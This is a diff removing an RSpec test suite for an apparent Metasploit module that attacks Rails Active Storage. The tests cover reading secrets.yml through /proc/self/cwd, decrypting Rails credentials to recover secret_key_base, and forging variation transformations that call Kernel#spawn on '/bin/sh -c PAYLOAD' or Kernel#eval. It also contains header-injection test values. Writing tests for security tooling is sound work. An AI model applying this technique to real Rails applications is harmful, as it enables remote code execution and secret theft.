-  describe '#verify_known_secret_context' do
-    it 'falls back to and retains the Rails 6.0 legacy representation route' do
-      context = {
-        signed_id: 'blob',
-        verifier_key: 'key',
-        verifier_digest: 'sha1',
-        message_serializer: :json
-      }
-      allow(exploit).to receive(:forged_representation_path) do |candidate, transformations|
-        expect(transformations).to eq('resize_to_limit' => [1, 1])
-        "/#{candidate.fetch(:representation_route)}"
-      end
-      allow(exploit).to receive(:request_representation).with('/redirect').and_return(http_response(404))
-      allow(exploit).to receive(:request_representation).with('/legacy').and_return(http_response(200, body: png_signature))
-
-      exploit.send(:verify_known_secret_context, context)
-
-      expect(context[:representation_route]).to eq(:legacy)
-    end
-  end
-
-  describe '#request_variation_key_representation' do
-    before do
-      exploit.datastore['VARIATION_KEY'] = 'variation'
-    end
-
-    it 'falls back to and retains the Rails 6.0 legacy route for crafted reads' do
-      allow(exploit).to receive(:request_representation)
-        .with('/rails/active_storage/representations/redirect/blob/variation/read.png')
-        .and_return(http_response(404))
-      allow(exploit).to receive(:request_representation)
-        .with('/rails/active_storage/representations/blob/variation/read.png')
-        .and_return(http_response(200, body: png_signature))
-
-      first_path, first_response = exploit.send(:request_variation_key_representation, 'blob', 'read.png')
-
-      expect(first_path).to eq('/rails/active_storage/representations/blob/variation/read.png')
-      expect(first_response.code).to eq(200)
-      expect(exploit.instance_variable_get(:@variation_key_route)).to eq(:legacy)
-
-      expect(exploit).to receive(:request_representation)
-        .with('/rails/active_storage/representations/blob/variation/next.png')
-        .and_return(http_response(200, body: png_signature))
-      second_path, = exploit.send(:request_variation_key_representation, 'blob', 'next.png')
-
-      expect(second_path).to eq('/rails/active_storage/representations/blob/variation/next.png')
-    end
-
-    it 'does not consult the application representation workflow when a key is supplied' do
-      expect(exploit).not_to receive(:base_representation_path)
-      allow(exploit).to receive(:request_variation_key_representation).with('blob', 'read.png').and_return(['/path', http_response(200)])
-
-      expect(exploit.send(:request_crafted_representation, 'blob', 'read.png').first).to eq('/path')
-    end
-  end
-
-  describe '#direct_upload' do
-    it 'rejects successful responses whose JSON root is not an object' do
-      expect(exploit).not_to receive(:send_request_to_url)
-
-      ['[]', 'null', 'true'].each do |body|
-        allow(exploit).to receive(:send_request_cgi).and_return(http_response(200, body: body))
-
-        expect do
-          exploit.send(
-            :direct_upload,
-            csrf_token: 'csrf',
-            filename: 'image.png',
-            content_type: 'image/png',
-            content: 'PNG'
-          )
-        end.to raise_error(flow_error, /JSON object/i)
-      end
-    end
-
-    it 'reports Active Storage before uploading the blob content' do
-      service = double('Rails service')
-      create_response = http_response(
-        200,
-        body: {
-          signed_id: 'signed-id',
-          direct_upload: {
-            url: 'https://storage.example/object',
-            headers: {}
-          }
-        }.to_json
-      )
-      upload_response = http_response(204)
-      expect(exploit).to receive(:send_request_cgi).ordered.and_return(create_response)
-      expect(exploit).to receive(:report_active_storage_service).ordered.and_return(service)
-      expect(exploit).to receive(:send_request_to_url).ordered.with(
-        'https://storage.example/object',
-        method: 'PUT',
-        data: 'PNG',
-        headers: {}
-      ).and_return(upload_response)
-
-      signed_id = exploit.send(
-        :direct_upload,
-        csrf_token: 'csrf',
-        filename: 'image.png',
-        content_type: 'image/png',
-        content: 'PNG'
-      )
-
-      expect(signed_id).to eq('signed-id')
-      expect(exploit.instance_variable_get(:@active_storage_service)).to be(service)
-    end
-  end
-
-  describe '#request_representation' do
-    before do
-      exploit.datastore['RHOST'] = 'app.example'
-      exploit.datastore['RPORT'] = 443
-      exploit.datastore['SSL'] = true
-      exploit.datastore['VHOST'] = 'app.example'
-      exploit.datastore['COOKIE'] = 'session=application-secret'
-      exploit.datastore['HttpUsername'] = 'application-user'
-      exploit.datastore['HttpPassword'] = 'application-password'
-      exploit.datastore['ExternalStorageOrigins'] = 'https://storage.example'
-    end
-
-    it 'keeps cross-origin redirects isolated when the chain returns to the application origin' do
-      application_redirect = http_response(302, location: 'https://storage.example/object?signature=public')
-      storage_redirect = http_response(302, location: 'https://app.example/rails/active_storage/object')
-      final_response = http_response(200)
-      sanitized_requests = []
-      sanitized_responses = [storage_redirect, final_response]
-
-      expect(exploit).to receive(:send_request_cgi).once do |options|
-        expect(options).to include(
-          'method' => 'GET',
-          'uri' => '/rails/active_storage/representations/redirect/blob/variation/image.png',
-          'cookie' => 'session=application-secret'
-        )
-        application_redirect
-      end
-      allow(exploit).to receive(:send_sanitized_request) do |options|
-        sanitized_requests << options
-        sanitized_responses.shift
-      end
-
-      response = exploit.send(
-        :request_representation,
-        'https://app.example/rails/active_storage/representations/redirect/blob/variation/image.png'
-      )
-
-      expect(response).to be(final_response)
-      expect(sanitized_requests.map { |request| request['rhost'] }).to eq(%w[storage.example app.example])
-      sanitized_requests.each do |request|
-        expect(request.keys).not_to include('cookie', 'authorization', 'username', 'password')
-        expect(request.fetch('headers')).to eq('Accept' => 'image/png', 'Connection' => 'close')
-      end
-    end
-
-    it 'rejects a redirect chain that exceeds the bounded hop count' do
-      redirect = http_response(302, location: '/rails/active_storage/representations/redirect/next')
-      limit = exploit.class::REPRESENTATION_REDIRECT_LIMIT
-
-      expect(exploit).to receive(:send_request_cgi).exactly(limit + 1).times.and_return(redirect)
-
-      expect do
-        exploit.send(
-          :request_representation,
-          'https://app.example/rails/active_storage/representations/redirect/blob/variation/image.png'
-        )
-      end.to raise_error(flow_error, /redirect limit/i)
-    end
-
-    it 'rejects malformed redirect locations as a module flow error' do
-      expect(exploit).to receive(:send_request_cgi).once.and_return(http_response(302, location: 'mailto:a'))
-
-      expect do
-        exploit.send(
-          :request_representation,
-          'https://app.example/rails/active_storage/representations/redirect/blob/variation/image.png'
-        )
-      end.to raise_error(flow_error, /redirect was invalid/i)
-    end
-
-    it 'requires an exact operator-approved origin before following an external redirect' do
-      exploit.datastore['ExternalStorageOrigins'] = nil
-      expect(exploit).to receive(:send_request_cgi).once.and_return(http_response(302, location: 'https://storage.example/object'))
-      expect(exploit).not_to receive(:send_sanitized_request)
-
-      expect do
-        exploit.send(
-          :request_representation,
-          'https://app.example/rails/active_storage/representations/redirect/blob/variation/image.png'
-        )
-      end.to raise_error(config_error, /ExternalStorageOrigins/)
-    end
-
-    it 'rejects oversized final and redirect response bodies' do
-      oversized = 'A'.b * (png_decoder::MAX_DATA_BYTES + 1)
-      [http_response(200, body: oversized), http_response(302, location: '/next', body: oversized)].each do |response|
-        allow(exploit).to receive(:send_request_cgi).and_return(response)
-
-        expect do
-          exploit.send(
-            :request_representation,
-            'https://app.example/rails/active_storage/representations/redirect/blob/variation/image.png'
-          )
-        end.to raise_error(flow_error, /exceeded/i)
-      end
-    end
-
-    it 'recognizes an absolute IPv6 literal URL as same-origin' do
-      exploit.datastore['RHOST'] = '2001:db8::10'
-      exploit.datastore['RPORT'] = 3003
-      exploit.datastore['SSL'] = false
-      exploit.datastore['VHOST'] = nil
-      response = http_response(200)
-
-      expect(exploit).not_to receive(:send_sanitized_request)
-      expect(exploit).to receive(:send_request_cgi).with(
-        hash_including(
-          'method' => 'GET',
-          'uri' => '/rails/active_storage/representations/redirect/blob/variation/image.png'
-        )
-      ).and_return(response)
-
-      result = exploit.send(
-        :request_representation,
-        'http://[2001:db8::10]:3003/rails/active_storage/representations/redirect/blob/variation/image.png'
-      )
-
-      expect(result).to be(response)
-    end
-  end
-
-  describe '#send_request_to_url' do
-    it 'passes an unbracketed IPv6 hostname to the sanitized HTTP client' do
-      exploit.datastore['ExternalStorageOrigins'] = 'https://[2001:db8::20]'
-      response = http_response(204)
-      expect(exploit).to receive(:send_sanitized_request).with(
-        hash_including(
-          'rhost' => '2001:db8::20',
-          'rport' => 443,
-          'SSL' => true,
-          'vhost' => '2001:db8::20'
-        )
-      ).and_return(response)
-
-      result = exploit.send(
-        :send_request_to_url,
-        'https://[2001:db8::20]/object',
-        method: 'PUT',
-        data: 'content',
-        headers: {}
-      )
-
-      expect(result).to be(response)
-    end
-
-    it 'allows stock storage headers but rejects authority, framing, authentication, and control headers' do
-      exploit.datastore['RHOST'] = 'app.example'
-      exploit.datastore['RPORT'] = 443
-      exploit.datastore['SSL'] = true
-      valid_headers = {
-        'Content-Type' => 'image/png',
-        'Content-MD5' => 'checksum',
-        'Content-Disposition' => 'inline',
-        'Cache-Control' => 'max-age=3600',
-        'x-amz-meta-test' => 'one',
-        'x-goog-meta-test' => 'two',
-        'x-ms-blob-type' => 'BlockBlob',
-        'X-Optional' => nil
-      }
-      response = http_response(204)
-      expect(exploit).to receive(:send_request_cgi).with(
-        hash_including(
-          'headers' => valid_headers.compact.merge('Connection' => 'close')
-        )
-      ).and_return(response)
-
-      expect(
-        exploit.send(
-          :send_request_to_url,
-          'https://app.example/object',
-          method: 'PUT',
-          data: 'content',
-          headers: valid_headers
-        )
-      ).to be(response)
-
-      invalid_headers = [
-        { 'Host' => 'internal.example' },
-        { 'content-length' => '1' },
-        { 'Transfer-Encoding' => 'chunked' },
-        { 'Authorization' => 'Bearer reflected-secret' },
-        { 'Cookie' => 'session=reflected-secret' },
-        { "X-Bad\r\nInjected" => 'value' },
-        { 'X-Bad' => "value\r\nInjected: true" },
-        { 'X-Bad' => 7 },
-        { 'X-Test' => 'one', 'x-test' => 'two' },
-        { 'X-Test' => nil, 'x-test' => 'two' },
-        (0..exploit.class::MAX_UPLOAD_HEADERS).to_h { |index| ["X-Header-#{index}", 'value'] },
-        { 'X-Large' => 'A' * (exploit.class::MAX_UPLOAD_HEADER_VALUE_BYTES + 1) },
-        (0...9).to_h { |index| ["X-Large-#{index}", 'A' * exploit.class::MAX_UPLOAD_HEADER_VALUE_BYTES] }
-      ]
-      invalid_headers.each do |headers|
-        expect do
-          exploit.send(
-            :send_request_to_url,
-            'https://app.example/object',
-            method: 'PUT',
-            data: 'content',
-            headers: headers
-          )
-        end.to raise_error(flow_error)
-      end
-    end
-  end
-
-  describe '#submit_safe_upload' do
-    before do
-      exploit.datastore['RHOST'] = 'app.example'
-      exploit.datastore['RPORT'] = 443
-      exploit.datastore['SSL'] = true
-      exploit.datastore['VHOST'] = 'app.example'
-      exploit.datastore['SUBMITURI'] = '/uploads'
-      exploit.datastore['ATTACHMENT_FIELD'] = 'upload[avatar]'
-    end
-
-    it 'follows a bounded same-origin redirect to the representation page' do
-      redirect = http_response(302, location: '/uploads/7')
-      final = http_response(
-        200,
-        body: '<img src="/rails/active_storage/representations/blob/variation/image.png">'
-      )
-
-      expect(exploit).to receive(:send_request_cgi).ordered.and_return(redirect)
-      expect(exploit).to receive(:send_request_cgi).ordered do |options|
-        expect(options).to include('method' => 'GET', 'uri' => '/uploads/7')
-        final
-      end
-
-      expect(exploit.send(:submit_safe_upload, 'csrf', 'signed')).to eq(
-        '/rails/active_storage/representations/blob/variation/image.png'
-      )
-    end
-
-    it 'rejects a cross-origin form redirect' do
-      redirect = http_response(302, location: 'https://storage.example/uploads/7')
-      allow(exploit).to receive(:send_request_cgi).and_return(redirect)
-
-      expect { exploit.send(:submit_safe_upload, 'csrf', 'signed') }.to raise_error(flow_error, /different origin/i)
-    end
-
-    it 'normalizes an opaque redirect location to a module flow error' do
-      allow(exploit).to receive(:send_request_cgi).and_return(http_response(302, location: 'mailto:a'))
-
-      expect { exploit.send(:submit_safe_upload, 'csrf', 'signed') }.to raise_error(flow_error, /redirect was invalid/i)
-    end
-  end
-
-  describe '#send_sanitized_request' do
-    it 'uses a fresh client with cookies and application authentication disabled' do
-      exploit.datastore['COOKIE'] = 'session=application-secret'
-      exploit.datastore['HttpUsername'] = 'application-user'
-      exploit.datastore['HttpPassword'] = 'application-password'
-      logger = instance_double(Rex::Proto::Http::HttpLoggerSubscriber)
-      client = instance_double(Rex::Proto::Http::Client)
-      request = instance_double(Rex::Proto::Http::Request)
-      response = http_response(200)
-      request_options = nil
-
-      allow(Rex::Proto::Http::HttpLoggerSubscriber).to receive(:new).and_return(logger)
-      expect(Rex::Proto::Http::Client).to receive(:new) do |*arguments, **keywords|
-        expect(arguments.values_at(0, 1, 3, 6, 7)).to eq(['storage.example', 443, true, '', ''])
-        expect(keywords).to include(kerberos_authenticator: nil, subscriber: logger)
-        client
-      end
-      expect(client).to receive(:set_config).with(
-        hash_including(
-          'vhost' => 'storage.example',
-          'ssl_server_name_indication' => 'storage.example',
-          'raw_headers' => ''
-        )
-      )
-      expect(client).to receive(:request_cgi) do |options|
-        request_options = options
-        request
-      end
-      expect(client).to receive(:_send_recv).with(request, 20).and_return(response)
-      expect(client).to receive(:close)
-
-      result = exploit.send(
-        :send_sanitized_request,
-        {
-          'method' => 'GET',
-          'uri' => '/object',
-          'headers' => { 'Accept' => 'image/png' },
-          'cookie' => 'must-not-survive',
-          'authorization' => 'must-not-survive',
-          'username' => 'must-not-survive',
-          'password' => 'must-not-survive',
-          'rhost' => 'storage.example',
-          'rport' => 443,
-          'SSL' => true,
-          'vhost' => 'storage.example'
-        }
-      )
-
-      expect(result).to be(response)
-      expect(request_options).to include(
-        'cookie' => nil,
-        'raw_headers' => '',
-        'authorization' => nil,
-        'username' => '',
-        'password' => '',
-        'preferred_auth' => 'None',
-        kerberos_authenticator: false
-      )
-      expect(request_options.to_s).not_to include('application-secret', 'application-user', 'application-password', 'must-not-survive')
-    end
-  end
-
-  describe '#sanitized_request_timeout' do
-    it 'uses a finite fallback when HttpClientTimeout is unset or non-positive' do
-      [nil, 0, -1].each do |configured_timeout|
-        exploit.datastore['HttpClientTimeout'] = configured_timeout
-
-        expect(exploit.send(:sanitized_request_timeout)).to eq(20)
-      end
-    end
-
-    it 'honors a positive HttpClientTimeout' do
-      exploit.datastore['HttpClientTimeout'] = 7.5
-
-      expect(exploit.send(:sanitized_request_timeout)).to eq(7.5)
-    end
-  end
-
-  describe '#trigger_variation' do
-    before do
-      exploit.datastore['RHOST'] = 'app.example'
-      exploit.datastore['RPORT'] = 443
-      exploit.datastore['SSL'] = true
-      exploit.datastore['VHOST'] = 'app.example'
-    end
-
-    it 'treats redirects and definitive client-side rejection statuses as trigger failures' do
-      [300, 301, 302, 303, 307, 308, 400, 401, 403, 404, 405, 414, 422, 429, 499].each do |status|
-        allow(exploit).to receive(:send_request_cgi).and_return(http_response(status))
-
-        expect do
-          exploit.send(:trigger_variation, '/rails/active_storage/representations/redirect/blob/forged/image.png')
-        end.to raise_error(trigger_error, /rejected with HTTP #{status}/)
-      end
-    end
-
-    it 'allows an ambiguous server error because command execution may have occurred first' do
-      allow(exploit).to receive(:send_request_cgi).and_return(http_response(500))
-
-      expect do
-        exploit.send(:trigger_variation, '/rails/active_storage/representations/redirect/blob/forged/image.png')
-      end.not_to raise_error
-    end
-  end
-
-  describe '#decrypt_rails_credentials' do
-    let(:master_key) { '00112233445566778899aabbccddeeff' }
-    let(:encrypted_credentials) do
-      'L91+5oK6ok2VS0z8Yug1smZ69BUW0J3otX65PIRv40ZC4LM4PHsskwDI///UK9Olqw==' \
-        '--AAECAwQFBgcICQoL--1BoUyMzI7zRVEcKrsUPuzA=='
-    end
-    let(:plaintext_hex) do
-      '040849222c2d2d2d0a7365637265745f6b65795f626173653a2063726564656e7469616c2d7365637265740a063a064554'
-    end
-
-    it 'decrypts a Rails-compatible AES-128-GCM credentials envelope' do
-      plaintext = exploit.send(:decrypt_rails_credentials, encrypted_credentials, master_key)
-
-      expect(plaintext).to eq([plaintext_hex].pack('H*'))
-    end
-
-    it 'rejects a modified authentication tag' do
-      parts = encrypted_credentials.split('--')
-      tag = Base64.strict_decode64(parts.fetch(2))
-      tag.setbyte(0, tag.getbyte(0) ^ 1)
-      parts[2] = Base64.strict_encode64(tag)
-
-      expect(exploit.send(:decrypt_rails_credentials, parts.join('--'), master_key)).to be_nil
-    end
-
-    it 'rejects non-Rails GCM IV and authentication tag lengths' do
-      parts = encrypted_credentials.split('--')
-      iv = Base64.strict_decode64(parts.fetch(1))
-      tag = Base64.strict_decode64(parts.fetch(2))
-
-      [iv.byteslice(0, 11), iv + "\x00".b].each do |invalid_iv|
-        candidate = parts.dup
-        candidate[1] = Base64.strict_encode64(invalid_iv)
-        expect(exploit.send(:decrypt_rails_credentials, candidate.join('--'), master_key)).to be_nil
-      end
-      [tag.byteslice(0, 15), tag + "\x00".b].each do |invalid_tag|
-        candidate = parts.dup
-        candidate[2] = Base64.strict_encode64(invalid_tag)
-        expect(exploit.send(:decrypt_rails_credentials, candidate.join('--'), master_key)).to be_nil
-      end
-    end
-
-    it 'rejects malformed envelopes and invalid master keys' do
-      expect(exploit.send(:decrypt_rails_credentials, 'not--enough-parts', master_key)).to be_nil
-      expect(exploit.send(:decrypt_rails_credentials, '%%%--%%%--%%%', master_key)).to be_nil
-      expect(exploit.send(:decrypt_rails_credentials, encrypted_credentials, 'not-a-master-key')).to be_nil
-    end
-  end
-
-  describe 'legacy secrets.yml recovery' do
-    let(:environments) { %w[production staging development test] }
-    let(:secrets_key) { '000102030405060708090a0b0c0d0e0f' }
-
-    # Rails::Secrets encrypts secrets.yml.enc with ActiveSupport::MessageEncryptor
-    # (aes-128-gcm, Marshal serializer, no purpose), producing the same padded
-    # Base64 ciphertext--iv--tag envelope wrapped around a Marshal string.
-    def secrets_yml_enc(yaml, key_hex)
-      cipher = OpenSSL::Cipher.new('aes-128-gcm')
-      cipher.encrypt
-      cipher.key = [key_hex].pack('H*')
-      iv = "\x00".b * 12
-      cipher.iv = iv
-      cipher.auth_data = ''
-      encrypted = cipher.update(Marshal.dump(yaml)) + cipher.final
-      [encrypted, iv, cipher.auth_tag].map { |part| Base64.strict_encode64(part) }.join('--')
-    end
-
-    it 'decrypts and extracts secret_key_base from an encrypted secrets.yml.enc' do
-      yaml = "shared:\n  a: 1\nproduction:\n  secret_key_base: #{'c' * 128}\n"
-      envelope = secrets_yml_enc(yaml, secrets_key)
-
-      plaintext = exploit.send(:decrypt_rails_credentials, envelope, secrets_key)
-      unwrapped = exploit.send(:unwrap_marshaled_string, plaintext)
-
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, unwrapped, environments)).to eq(['c' * 128])
-    end
-
-    it 'reads environment-keyed plaintext secrets.yml and skips unrendered ERB' do
-      yaml = "production:\n  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %>\ndevelopment:\n  secret_key_base: #{'d' * 128}\n"
-
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, yaml, environments)).to eq(['d' * 128])
-    end
-
-    it 'applies environment values over shared values and retains the shared fallback' do
-      yaml = "shared:\n  secret_key_base: #{'s' * 128}\nproduction:\n  secret_key_base: #{'p' * 128}\ndevelopment:\n  other: value\n"
-
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, yaml, environments)).to eq(['p' * 128, 's' * 128])
-    end
-
-    it 'supports safe YAML aliases used for shared secrets' do
-      yaml = "shared: &shared\n  secret_key_base: #{'s' * 128}\nproduction:\n  <<: *shared\n"
-
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, yaml, ['production'])).to eq(['s' * 128])
-    end
-
-    it 'tries later environment candidates after a signature mismatch' do
-      production_secret = 'p' * 128
-      development_secret = 'd' * 128
-      yaml = "production:\n  secret_key_base: #{production_secret}\ndevelopment:\n  secret_key_base: #{development_secret}\n"
-      context = { representation: { signed_id: 'signed-id' } }
-      validated = [development_secret, '/proc/self/cwd/config/secrets.yml', 'sha1', { encoded: 'token' }]
-      allow(exploit).to receive(:try_read_text_file) do |_context, path, **_kwargs|
-        path == '/proc/self/cwd/config/secrets.yml' ? yaml.b : nil
-      end
-      expect(exploit).to receive(:validated_secret_candidate).ordered.with(production_secret, '/proc/self/cwd/config/secrets.yml', 'signed-id').and_return(nil)
-      expect(exploit).to receive(:validated_secret_candidate).ordered.with(development_secret, '/proc/self/cwd/config/secrets.yml', 'signed-id').and_return(validated)
-
-      expect(exploit.send(:recover_legacy_secrets, context, %w[production development], [])).to eq(validated)
-    end
-
-    it 'returns an empty array for documents with no usable secret and for malformed YAML' do
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, "production:\n  a: 1\n", environments)).to be_empty
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, '!!invalid: [', environments)).to be_empty
-    end
-
-    it 'rejects deeply nested target-controlled YAML without exhausting the Ruby stack' do
-      nested_yaml = ('[' * 2000) + '0' + (']' * 2000)
-
-      expect(exploit.send(:secret_key_base_candidates_from_secrets_yaml, nested_yaml, environments)).to be_empty
-      expect(exploit.send(:extract_secret_key_base_from_plaintext, nested_yaml)).to be_nil
-    end
-  end
-
-  describe '#variation_transformations' do
-    before { allow(exploit).to receive(:payload).and_return(double('payload', encoded: 'PAYLOAD')) }
-
-    it 'dispatches Kernel#spawn for the default command target' do
-      exploit.datastore['TARGET'] = 0
-
-      expect(exploit.send(:variation_transformations)).to eq('send' => ['spawn', '/bin/sh', '-c', 'PAYLOAD'])
-    end
-
-    it 'dispatches Kernel#eval for the native Ruby target' do
-      exploit.datastore['TARGET'] = 2
-
-      expect(exploit.send(:variation_transformations)).to eq('send' => ['eval', 'PAYLOAD'])
-    end
-  end
-end
-# rubocop:enable Metrics/BlockLength
